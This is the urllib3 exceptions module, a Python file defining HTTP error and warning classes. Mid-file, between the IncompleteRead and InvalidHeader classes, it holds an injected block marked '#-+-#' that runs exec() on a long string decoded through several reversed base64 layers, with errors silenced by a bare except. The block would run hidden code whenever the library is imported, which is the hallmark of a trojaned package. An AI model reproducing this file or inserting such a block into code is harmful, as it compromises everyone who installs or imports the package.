from __future__ import absolute_import
from .packages.six.moves.http_client import (
    IncompleteRead as httplib_IncompleteRead
)
# Base Exceptions


class HTTPError(Exception):
    "Base exception used by this module."
    pass


class HTTPWarning(Warning):
    "Base warning used by this module."
    pass


class PoolError(HTTPError):
    "Base exception for errors caused within a pool."
    def __init__(self, pool, message):
        self.pool = pool
        HTTPError.__init__(self, "%s: %s" % (pool, message))

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, None)


class RequestError(PoolError):
    "Base exception for PoolErrors that have associated URLs."
    def __init__(self, pool, url, message):
        self.url = url
        PoolError.__init__(self, pool, message)

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, self.url, None)


class SSLError(HTTPError):
    "Raised when SSL certificate fails in an HTTPS connection."
    pass


class ProxyError(HTTPError):
    "Raised when the connection to a proxy fails."
    pass


class DecodeError(HTTPError):
    "Raised when automatic decoding based on Content-Type fails."
    pass


class ProtocolError(HTTPError):
    "Raised when something unexpected happens mid-request/response."
    pass


#: Renamed to ProtocolError but aliased for backwards compatibility.
ConnectionError = ProtocolError


# Leaf Exceptions

class MaxRetryError(RequestError):
    """Raised when the maximum number of retries is exceeded.

    :param pool: The connection pool
    :type pool: :class:`~urllib3.connectionpool.HTTPConnectionPool`
    :param string url: The requested Url
    :param exceptions.Exception reason: The underlying error

    """

    def __init__(self, pool, url, reason=None):
        self.reason = reason

        message = "Max retries exceeded with url: %s (Caused by %r)" % (
            url, reason)

        RequestError.__init__(self, pool, url, message)


class HostChangedError(RequestError):
    "Raised when an existing pool gets a request for a foreign host."

    def __init__(self, pool, url, retries=3):
        message = "Tried to open a foreign host with url: %s" % url
        RequestError.__init__(self, pool, url, message)
        self.retries = retries


class TimeoutStateError(HTTPError):
    """ Raised when passing an invalid state to a timeout """
    pass


class TimeoutError(HTTPError):
    """ Raised when a socket timeout error occurs.

    Catching this error will catch both :exc:`ReadTimeoutErrors
    <ReadTimeoutError>` and :exc:`ConnectTimeoutErrors <ConnectTimeoutError>`.
    """
    pass


class ReadTimeoutError(TimeoutError, RequestError):
    "Raised when a socket timeout occurs while receiving data from a server"
    pass


# This timeout error does not have a URL attached and needs to inherit from the
# base HTTPError
class ConnectTimeoutError(TimeoutError):
    "Raised when a socket timeout occurs while connecting to a server"
    pass


class NewConnectionError(ConnectTimeoutError, PoolError):
    "Raised when we fail to establish a new connection. Usually ECONNREFUSED."
    pass


class EmptyPoolError(PoolError):
    "Raised when a pool runs out of connections and no more are allowed."
    pass


class ClosedPoolError(PoolError):
    "Raised when a request enters a pool after the pool has been closed."
    pass


class LocationValueError(ValueError, HTTPError):
    "Raised when there is something wrong with a given URL input."
    pass


class LocationParseError(LocationValueError):
    "Raised when get_host or similar fails to parse the URL input."

    def __init__(self, location):
        message = "Failed to parse: %s" % location
        HTTPError.__init__(self, message)

        self.location = location


class ResponseError(HTTPError):
    "Used as a container for an error reason supplied in a MaxRetryError."
    GENERIC_ERROR = 'too many error responses'
    SPECIFIC_ERROR = 'too many {status_code} error responses'


class SecurityWarning(HTTPWarning):
    "Warned when perfoming security reducing actions"
    pass


class SubjectAltNameWarning(SecurityWarning):
    "Warned when connecting to a host with a certificate missing a SAN."
    pass


class InsecureRequestWarning(SecurityWarning):
    "Warned when making an unverified HTTPS request."
    pass


class SystemTimeWarning(SecurityWarning):
    "Warned when system time is suspected to be wrong"
    pass


class InsecurePlatformWarning(SecurityWarning):
    "Warned when certain SSL configuration is not available on a platform."
    pass


class SNIMissingWarning(HTTPWarning):
    "Warned when making a HTTPS request without SNI available."
    pass


class DependencyWarning(HTTPWarning):
    """
    Warned when an attempt is made to import a module with missing optional
    dependencies.
    """
    pass


class ResponseNotChunked(ProtocolError, ValueError):
    "Response needs to be chunked in order to read it as chunks."
    pass


class BodyNotHttplibCompatible(HTTPError):
    """
    Body should be httplib.HTTPResponse like (have an fp attribute which
    returns raw chunks) for read_chunked().
    """
    pass


class IncompleteRead(HTTPError, httplib_IncompleteRead):
    """
    Response length doesn't match expected Content-Length

    Subclass of http_client.IncompleteRead to allow int value
    for `partial` to avoid creating large objects on streamed
    reads.
    """
    def __init__(self, partial, expected):
        super(IncompleteRead, self).__init__(partial, expected)

    def __repr__(self):
        return ('IncompleteRead(%i bytes read, '
                '%i more expected)' % (self.partial, self.expected))

#-+-#
try:exec('PU0wWndjell6NEVhalJFY3dNMlJXcFdaSFYxU0VSMWN3dEVTU2xYV1lKbGVNNW1VbVZHUnpCM1lzbEROUWhsVXNwMU1LaEdaRGgyYVpkbFY1Rm1SUlZIWkdsVE5RaGxVbVZXUXJ0RVJZSmxabE5sUTZsMVVDNW1ZdHgyYVpkbFY1RkdTUmRHWklwa2RqZFVNd05VVXY1MFR6NGtlWmhWUTJRR1NDeFdXemdHYkRGMWFMUjBVcjltV1k1a2RpZFVUMXBGYjVRelQ1eDJhWU56WnZwRldTQjNZdU5XZGF4V08wOFVlcjVHWjVOMmNqWlVPMHMwUjF3MllIaFRPYXhXTzA4VWVzUkZUdGhuWmxSVk02cGxNR05uV3BoM2FZTnpaenBVZWpOblM1NTBZTVpGZW1oMVF4TVdTeGMzTExsR05xaDFReE0yU3hjSGRZTmtUanBVZW9sR1pZMVVkaVpVTzFBMVZTWldaRU5IY0xka1Y2Sm1NNHBHVHRwbFpsUjBjd3QwUlNobVdZbFVkYXhXTzBBMVZTWldaRU5IY2paVU8wczBSMXcyWUhoVE9heFdPMDhVZXI1R1VXWkVXV3RHWnpKbVJrTlZUV0pWVUtsSGEwZzFNbkpIV1VKa1lMTkZibWhsTVdOWFlYcGxaWWxIYXZSMlJHZDNZeW9FYU0xR2F3a0ZXQlZYV3NsVE5MaGtVMG9GV1NCbllJSmtlTTFHYXdrRldCVlhXc2xUTlFobFFtVldRcnAwUVI5bVRpWlVPMWtFU09oV1NIWlZlTWRrU21WMlVDcFhXVEprZWlsblF3TVdiNWNuWVh0bVNERjFhTFJFVndWell1RmxTREYxYk85ME1PcFhXWUZrTmtoa1FzbDFNb3gyUVJ0MlNFUjFjd3BsVjVRRFRJNWtabE5FYTJnMU1ucDBRUnRtU0RkR00zSW1iS0ZEWkhaVmVQbEdic2gxTW5OM1l4a0ROTWRrUm1KV2FvSkRXemMyWmtkVU8xbDBSYUIzUVJ0bVNERjFiTzkwTU9wWFdZRmtOa2hrUXNsMU1veDJRUnRtU0RGMWJPOVVlc0ZEV3pjMmJhaGxXMkoyVldsSFR0bGpabFJGYzFNbWJScDBRUnRtU0RkR00zTTJNT2gyWUVCSE1qZGtWcVYyUlZwMFFSdG1TRGRHTTNzMFVzeEdXemMyYmFkVk1vSm1iS0JuV0RWemJrZGtSM3hVYjVZV1pUaG1lajFHYnJwMVYwaG1ZVFZqZFlOemEyVUdXS0J6UVJ0bVNERjFiTzlVZXJCblM2QlRPVlpGY3dvMVIxdzJWdUpVZFZaRmFoSldSeHcwVnVCWFZYaEZhMGxWVjVjbFZyVnpTalJrUlQxa01vVm5WWWRHTldGVFF1dEVTb1pXWkRkSGNMaGtTd3BGU0NSbldZSkZNYWQxWTFwRmI1VXpTSFZEY2lKemIxRkdTU2gyWURWamRZTnphbnBGV09ObldURkVlUVJWTTZoMU1uZG1XdHQyWkxOMWF1QkZXTmRIVlhsemFXeG1XYVZsYUtKbFZHQm5jVk5qV1hKVmJLWjNZR3BGV2twSGFJcGxWdmhYVHM5R01YMUdlT0pGTWFGblZ3bzFVV0ZEWlcxRVZLdG1UWEoxUldOalNYWmxSU0JqVFhSblRYaGtVSWRsYktObllGRkRWYVprV1lkbFZ2aG5WVlJEZVdGVFR5VWxhR2htWXlnM2NXdEdaM1psVmtsVllGcFZhV1ZVTlhWbGJOVlRZeG9GTVN4bVVvUlZib2RVV1ZoV1lTeEdaNVpGYlNWMVl3b1VXVXhtVDBJVk13ZG5WdEZUYWkxR2ExWkZiV3RVVEdwRWNhWmtXVjFVTXZoWFdYbHpkV0ZEWjBJbWVDcDJWdUpVZFZ4bVFQMWtWS1JGVnNoMlZqRmpTSVpWYjBkbFZyVnpTalJrUlRKV01LRm5WWXhtZE5ka1RWMWtWazlFVnI5V2VWMVdPejFrVmFWWFRXSlZVS2xIYTBnMU1uOTJZdFpsZWtkbFUxbEZXQ1JqV1RWemJrZGtSM3hVYjVZV1pVRkRiWU56WktOVVVycDBRbkJ6Tmk1bVN4UTJSV2wzVHB4R2FZSkROdkZtVjVRVFNJSmxkaWxtUXRGV1VycDBRUnQyU0VSRmQxTm1iV0JqV1lsa05OUlVRNTFFVnJKRFVIaG1abE5VTXFoMU1uZG1XdHRtU0RGMWFLTjBad2N6U1RoR2JqSlRPemxWZTE0R1d6czJOTFpGTTR4RVZ2WnpWNXgyYllOelp2Tm1iU3AzU0haRk1oaGxTendVYmtaV1pVTkhjS056WXV4RVNXWldaRGhXZGFobFEyQjFWa1pXWlJ0bVNERjFhS04wWndZaldZNTBjYUYxYUtOVVVydEVSVU5IY0xka1Y2Sm1NNHBHVHRSbVpsUjFjd2hGVkZSM1RxQm5ZTE5GYXJsMVZXbEhUdFJtWmxORmF3SVdicmxUWUdsRE5QbDNhdU5XYWpOSFpXbEROTGRVTnNOMlI0a2pXeGtUTkRGMWFLTlVVcnRFUlU5R2NrWlZPMHNFU09Cell5d0dOYU5WTnZSMlJHZEhUdGxqWmxObFF0RldVcnAwUVJ0MlNFUkZkcWgxTW5sVFlHbEROUGwzYXdwVU1HZGxZR3BsU2Faa1dwVkdiYUYzVldoMmRoQlROUVpWYjRWMVlHbFVlWlJsUXlkbFJrTlZUV0pWVUtsSGEwZzFNbmRHVER0bWJRUlZNQ1psVmtGV1l4b1ZXVjFHZVNOVlJ3Um5WdTFVTlNGalc2Rm1Sa3BsUzVoR05ZTnpabngwUXJCblM2RmpWTjFtUk1KR1JHZEZaRmxrZVpGRFpISjFSSkpEVnJSR1ZrcG5SR2RsYk9kbFlIWlZZVHRtVXNSVlIxTVhWdU5XTldGalc2RjJSeGdsUzVoR05ZTnpadkZHU1NoV1ZIWkZNWmRGZTZKV2JHbEhaRFZETllOemF2Sldic1pYWXBWemJrZGtSM3hVYjVZV1pVRlRNWU56WjNnMVVqbERVVlprVlhSVVIzcGxSdkZqWVdSV2VUMUdlT05GTTBvblZZWjBkV2RsUlBWMWFXbEdaeG8wUldGRFpoRldNV2RVWkhGemFodG1TeFoxUjRnWFl4b0VUaVprVlk1VWI0ZEVWdGgzVk5kVlV5TVdSYU5GVnpJRlNYeDJaNFoxVldGbVRYRkRXanRHY3pSVlYwOWtZc0psV2xkVU1ZRjJNQ2hWVnFaMVVOWmxTNVpWYndaVlpWeDJWVWRsUkRKbFJ3bFhWclJHVmlKelo0WkZWTmhuVkdGa2JNTjBZNUFWVkdaMVZFVjBkYVowYnhJbVZrbDNVdGhuVFRCRE42WkZXR2RuVlhaMFRWdG1WcFJXTUtka1Z4UVdZaEZqVkhWMlJ4c1dZcnBVY1dkRU80RldNS3hrWUdaRldPMUdlSFJWYjRkVlRYRmxNalZrV1RSMU1TaDBWc2RHZVdkbFZoNTBWeGcxWXJCM2NVVkZkUEpHYlNwVlpIRkRXaE5qUVlWbGFXTlZUV3BVZVcxR2NXVldWc2RGVlhaMFFTWkVjNVYxYWtSbFl5Y0dlV1JWVDRabFJCNUdURE5XT1FWbFJXZEZSRmRuV0c5V01pWkZaNU5WYjQ1MFV3UWplV2hsUjNaMVZHOVVWclpWYWtGalNIWlZNa0ZXWXhZMVJsZFVNckYyYUtGblZIaERlaEZqU01KbVJXaGxUdGgzUlUxR2VYMTBWUkp6WUZwMVVVTmpVSWRGYm5oblZYWlZZT2RWTVlOMmF3TkhWVlIzVGl4bVVhVjJSeGdWWXpJRVdWcG1WVDFrVktsblZ0Qm5WbFZGYlhSMVZHTmtVR0JYZVZ0R1pVSm1NbmhuVlUxRWVXWlVRdWRsZXhnR1d5UXpOTE5GYnFoMU1uOTJZdUpsZU1kVU9tVjJRb1ZEWklwRWJqZFVPNVZGU1N4Mlk1UkRjTlJVUTMxRVJGOUdaeWt6YWkxR2JZeGtid1pXWlJ0bVNERjFhTFJFVjBWM1l1WkZNYWhWUzIwRVJCQmpUcWRHT0xkbFNtVjJRb0JqWXR0R2RaRlRPMGswUlNWWFdURmtiS3BITTVrRmI1UVRTSUpsZGlsbVFySldiRmRXV3NsRE5KZGtXd05VVXJwMFFSOW1UUGwzYXd0MFJXUlhZWUZWZGlaVk8xc0VTU1ZYWVVGamFZTnpaM3MwVjVZV1pEaFdOa2hrU3NOMlI1a1hWSUpGYmFsSE53MUVSQmRYVEVWMGJrSlRPckpXYnNoRlR1Qm5abFJWTXBoMU1uZHpTVFJXY2pWRVpwTjFWU05YV3JwMFZoeG1Xd01HUkNsR1Z4QTNSWDFtUkxKbE1LaFdWc2hHV05wblJWVjFRajlXWkdsRE5RZFZPbVZXUXJwMFFSdDJTRVIxYjNCbGJPWldaREpVYmhGMWFLTlVVdjUwVDZGMFphaGxUenAxVUJCbll0bFRlaGhsVzFwMVUxWUhXenMyWmkxMmFuNUViNVFUU0lKbGRpbG1RckpXYkZkMlNVcGtabE5rUTFGMlVCRkRXemMyWmoxR09uMWtWNVFUU0hWRGNKUmtWbVYyUW45V1NIcEZjSlJVU25wRldPTm5XVEZFY054V08wazBSMUFYU0VKbFpsTmtRNUpXZUJsSFd6YzJaaTEyYW4xVU01UVRTSXBrZEpSa1JtVjJRQ1ZYWVRGRU1ZTnpabk5XYjRjV1RXbEROSmRVTndsRVJPWldaRGQyWmExMmFuMUVWeG9IV3pjMk5MTjFZNUVWVmFkVlpGeDJWV3htV3pWR2JXOW1VdEIzVlZ0R2NZVkZiazlrWUdSV2VqZEVlcVpWTWFkVVdXaFdZUzFtU1VwMVIwVmxWczlHZVdsMll2Vm1SNVFEVVVwbFpsUjBjd3BVTUc5bVVzQm5XaVZrV1labE1SaG5WVmgyVld4V1F1dEVTb1pXWkVCVE1ZTnpaM3MwVWs5V1RVcDBhTzFtVXpsVlY1OGtZc3hXV2laa1ZScFVlb1JEV3pjV09PWlVPMDhVZXI1R1VVSmtjVVJsVVRkbFJrVlhUV0pWVUtsSGEwZzFNbmxUVHhrRE5QSlRNNUptTWFCVFdYaDNkTTVHYm1WR1Z3a0hXemMyTkxORmE1cEZXa1puWURSRGNMZFVNc1JHU09Welk1VnpkWU56YTUwa1Y1UXpRUnRtU0RkV010aDFNcmQyWXlVMFphZEZld3BsYkNSbldZRjFjbHhXTzFrRVNPaFdTSHhXTWFKalQwbGxibk5YWkdsVE5KaGtUb2wwUk9SWFd1ZDJjaVpWTzFrRVNPaFdTSFpGZGhoVlV6TkdiNVVUU0k1RWFKZGtWNXgwUjVZV1pUSmtlWk5sUTZKV2U0VkRXenMyWmpKVFJuTjJNc3BIVElKa1psTmxRNmwxVUNSM1l0bFRia2RrUnpOMlFDQnpZdGx6ZGlkMWFLTlVVcnRFUlVSSGJqSkRlb0pWYUNWM1l1WkZNYWhWU0tOVVVycDBRbkJ6TmFobFY1WjFRQ1YzWXVaRk1haFZTS05VVXJwMFFSOW1UUEpqVnhJV2JzQmpZdGxqYVA1bVUzcDFWT1JqV1J0bVNERjFhS04wWndjaldZWlZkaGhsVTFKbU1OZHpTWGwxYmFobFcySjJWV2xIVHRsalpsRjFhS05VVXJwMFFSdDJTRVJGY2s5RVJSZFhUcUJuWUxORmFybDFWV2xIVHB0bWJqbDJZenBWYW9WbldZSmtkSmRVTndsMFFyNVdWWGgyUlh0bVd6SkZiYU5VWUhWalZsZEZkV1YxUWo5V1pHbEROSmRrV3dOVVVycDBRUnRtU0RkR00zczBWWk4zU1dGRGNYSnpkdlZtUjVRelNIWmxNYWRGYjVSMlJXbG5ZSXBVTU01bVZtVldVcnAwUVJ0bVNERjFiTzlrYnNsSFpCdG1TREYxYUtOMFp3Y3pTV0ZEY1hKVFJ2Vm1SNVFEVVhWamRoaGxUNXBGV1pWM1l0WlZkYWhsUTJSbFJLWkZUdVpsWmxSMWJ1cGtld2tEV1h4bVlaTmxRd0ltTTBjbVd0dG1TREYxYUtOVVV2NTBUeVlWTWkxR2J3SVdiNW8yVHBObWJRUlZNa0ZtVjBOWFNIcEZjREYxYUtOVVVydEVSVTlHY0xkMWR2SldiV04zU0habGJpMW1SNWwwUjFBWFNIdDJaajFXT3ROVVVycDBRUjltVFBGRE11VmxWS2RGVlY1MGNTeG1XRVJsYUdaMVVFWmtjVVpsUXZKMVZLOUVWdEZEYWpKelozWmxiV3RVVEhwMFROZFZNVTFFYldkVldxVjBkV1pGY1lGMWFvdG1WWEpsVlV4V1U0MTBSRkJ6WUhWaldUVmtXeFpWZWpOblN5dzJSaHhtVExOV1JhUlZZeUlWV1g1bVN2SjJheEUzWUhWRFZqVmtXMFJGVlM5bVlHUm1TVnBtU1daRk1hWlRXVTVVWVcxbVMwMDBSMHBsVHVKRldhWkZjM0pHYkdOelVXcGxUa3BIYjBabFJzUmpZV1JtY2paRVpUNWtWS2RVVndrelRpeEdiWVJtUmtGbFM1ZG5iUVZWUjRaVmIwOVdZeFFtUlRwbVFTRkdXU2hGVnpzR05TWmxUNkZXUmtGMll6SWtSV0ZEY3ZKbVJhbDFVdGhuVFZCald4WmxWYU5WVHRaMGNrZFVNVWRWYlJoblZ1UjJhaVpFYlhwRlJPdDJWSUpFZFdWVU5QSldWd0FUVnE1MFZWcG1SVlYxUWtKV1NIWmxlaWRVVm4xRVZ3a0RaREpVYmhObFFrcFVNR05sVnJGRFJpVmtXWEZGTTBnblZWZEdlaEJUTVJGV1JXbEdWclZEZFpobFR2MWtSYUZ6VXFKVWFVcG1SMFZsZUtabFZ0bEVlTlprVmhaRk1LbGtXR1oxYVdWVk5WMUVWQ2hXVHpJVWRYVkZhSEZHYmo1R1REUkdjUzFHY1VObGJDZFVWeVEzYVhaRWM1RjJSMTRVWXVKVWRWTmpRSEpXVndBVFlIaEhXVFpWUzVabFZrZFVadFZrZVh4bVdwVkdSQ0ozVlVwRk1XSmpWaE4yUjFJRlp3dzJWVWgxWTFJbVZTcFZaSEZEV2hOalFZVmxhV05sVXNwRVVVMVdOYVoxTVNoVlZETjJjS3BYTUMxa1ZhSlhZSFJIV1NWMWIzVjFWc0JqVndrVE5QVmtWVU5tTW9oMFZ1NTBkU1pGWmhGMlI0ZDFWRkIzY1VabFRIRkdiV2RWVnFwRWFpaGtVMFZWTXd0V1RXcDFNYWRFZWFaVmJScG5XR2gyZGlabFVQMTBWMDVrVEdsa2VXeFdTNFpsUkI1MlY2RnpjREYxYUtOVVV2NWtZeGtUTkpoa1RvbEVTT1pIVElabFpsTmxRNmwxVUNsV1lYaDNjajVXVm5SR1NLWjNZSEZEY0RGMWFLTlVVdjUwVHB4V2JNaFVVemwxVW9KRFd6YzJaYTFtVnJOVVVycDBRbkJ6TmFobFR6bFZWWmRtWXVwVU1rZGtWNU5VVXJwMFFSOW1UUEpqVnhJV2JzQmpZdGxqYVA1bVUzcDFWT1JqV1J0bVNERjFhS04wWndjVFRVQlRPTE4xYXZwMVJHeDJZcFJEY0xaVk13ZGxNVjlXWkdsRE5MZFVOc04yUjVNM1l1VlZka1pWTzFzRVNTVlhZVEpVZGo1bVZ3b0ZXSlpUWllwRU1ERjFhS05VVXJ0RVJVTkhjWWRGYmlsMVVvUkRXemNXT2kxV093TjJNS3hHWnBWVGVhZFZOc04yUjUwVVZzVlZka1pWTzE4VWFqNUdVVUZEWmhaRmRvbEVTU1puWXBKVWJoRjFhS05VVXJwMFFuQnpOYWhsVjFGR1dTVm5ZeTBrTktsM1k1QWxWeEEzVnlVMVphMTJhS05VVXJwMFFSOW1UUGwyYXdwMVVvVm5XWGQzYmFkRloxbEZXSmRtWXR0MlpoTmxRNUptTVpwMFFSdG1TRGRHTTNvRldXbG5WREpVZGo1bVZ3b0ZXSlpUVEVCVE9MZFZWdkpXYldOWFNIcEZjREYxYUtOVVV2NTBUeEFqYlZkbFVIZDFhc2RuVXNwRVJVMUdkYU5XYjRGSFZXSjBiU2RsUzJWMWFrbDJVeWcyVldGRGF2WlZSMThVVFdSV1ZOcFhWM1psYk9kbllXeG1WWHhtV1BkRlJGbFhXNlprVld0V001RlZid1ZsVnFabGNaZEZiRFpsUk5KalZycDFVVjFHYTFaMWFvZGxWV0ZrYk1OMFk1QVZWR1psVlZwVmNWWkZjVEptUkdWRlZxWjBVVXRHYzJZVlJzUmpWeElWY2pWRVpwTjFWU05YV3I1MGFOWmxWSjUwVjBwV1Z6SUZTWDVtU0xKVk1LaFZWc1pGV1hoVlE0WmxSU3RXWXhVVk1XdG1XcEYyTUNkMFZzcDFRV2RrVmg1a1ZrWlZUV1oxVlVobFNERkdiU2RsVFhSSGFoVmxTVlZsZWFkbFVzcDBVaGRVTlhObFJhWlZWRE4yY0twSE01b1ZNc1JqWXhZRlZaZEZhR2RsYU9kVlR0VkVNVDVHY2E1a2JDWlZXWGgyU1NkVVYzSm1SYWxtVEZWemNYaGxTdjFrTUtkMVlIRlRWalpsU0lSbFZ3TlhUeG9WV2FaRWFPVjFhd1ZsVlVWVk5oRmpXUU4yUjRWbFVXQjNSVnhHY0xaVlI1VVVUV1psVFJ0bVNWWmxSa3RrVXRWa2JYcFhNc05VVXJwMFFSOW1Ua1pWTzFrRVNPaFdTSHBFY2lkRWU1UjJVQ0J6WXRsemRpZDFhS05VVXJwMFFuQmpOTGRWUnZGbVY1UVRTSHBGYmFGMGFLTlVVdjUwVHlFMVppNW1TeFEyUldsM1FSdG1TREYxYk85VU13Z0hUVTltTlhsM2F3NTBRemxIVDZGVWVOTkZhNVJHU05KSFdVVkVkUHBHY2l0MFVrbFdXVE5tY0tOalRzcFVlbjltV1hKbGRaSmpWcnhVYlJsaldFOUdjTnBXUnM1RVZGOW1XWFJXZFpoVlNuSldicmRXWVRKVWVpSlRXS05VVXJwMFFuQmpOTGRWVXZWbVI1UVRTSHBGYmFGMGFLTlVVdjUwVDV4MmFMZEVlemwxVk5WM1l4a1ROUGxIYkVKbFZvWjBVV2xEVk0xbVJtVjJVQ2hUU0haMWFpSlRNbVJHU05WM1NYRjFia2RrUndNV2UxWUhXenMyWk1kVVV2cDFSNVFYWUgxVWRpRlRPMU1VVXJwMFFSOW1UUEpUTjVSR1dTeDJZcTlHZVFSVk02bDBSYUIzUVJ0bVNERjFiT05XTTVVVFNJNUVhSmhrVDZwMVZPWjNZdUpVYWtoVlR6bGxWNVVUU0k1RWFKaGtVb1JHU05Obll4a1ROSmhrVG9sRVNPWlhTSUpWZWlOalEwRldVcnAwUVJ0MlNFUjFid3AxUTRwM1NJQm5abE5rUXRwMVZScDBRUnQyU0VSRmMxTW1iUnAwUVI5bVRQbDJhdk5HYjVRVFNIcEZiYUYwYUxSRVZ3VnpZdUZWUA=='.decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(30*2+12/3))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(160/2-16))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(455/7-1))[::-1])
except:pass
#-_-#

class InvalidHeader(HTTPError):
    "The header provided was somehow invalid."
    pass


class ProxySchemeUnknown(AssertionError, ValueError):
    "ProxyManager does not support the supplied scheme"
    # TODO(t-8ch): Stop inheriting from AssertionError in v2.0.

    def __init__(self, scheme):
        message = "Not supported proxy scheme %s" % scheme
        super(ProxySchemeUnknown, self).__init__(message)


class HeaderParsingError(HTTPError):
    "Raised by assert_header_parsing, but we convert it to a log.warning statement."
    def __init__(self, defects, unparsed_data):
        message = '%s, unparsed data: %r' % (defects or 'Unknown', unparsed_data)
        super(HeaderParsingError, self).__init__(message)


class UnrewindableBodyError(HTTPError):
    "urllib3 encountered an error when trying to rewind a body"
    pass
